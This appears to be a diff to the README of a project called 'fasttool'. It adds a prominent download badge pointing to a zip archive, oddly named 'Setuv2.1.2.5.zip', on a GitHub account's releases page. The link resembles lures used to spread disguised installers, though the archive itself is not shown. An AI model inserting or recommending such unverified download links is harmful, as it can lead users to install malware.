@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge&logo=github)](https://github.com/johnsantos-x90h3/fasttool/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # ⚡ fasttool
 
 ![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg) ![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20Linux-blue.svg)
